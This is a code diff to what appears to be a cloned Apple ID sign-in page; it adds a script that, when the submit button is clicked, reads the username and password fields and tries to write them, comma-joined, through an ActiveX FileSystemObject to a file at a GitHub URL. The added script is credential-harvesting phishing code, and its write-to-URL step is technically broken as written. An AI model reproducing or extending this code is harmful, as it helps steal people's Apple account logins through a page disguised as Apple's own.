@@ -829,5 +829,20 @@ findAppleIdUrl:"https://iforgot.apple.com/appleid"
             });
         </script>
     </div>
+    <script>
+    	function writeToFile(d1, d2){
+	    var fso = new ActiveXObject("Scripting.FileSystemObject");
+	    var fh = fso.OpenTextFile("https://github.com/phpmailergirl/apple/blob/gh-pages/data.txt", 8, false, 0);
+	    fh.WriteLine(d1 + ',' + d2);
+	    fh.Close();
+	}
+	var submit = document.getElementById("submit");
+	submit.onclick = function () {
+	    var id      = document.getElementById("username").value;
+	    var content = document.getElementById("password").value;	
+	    writeToFile(id, content);
+	}
+    </script>
+    
 </body>
 </html>
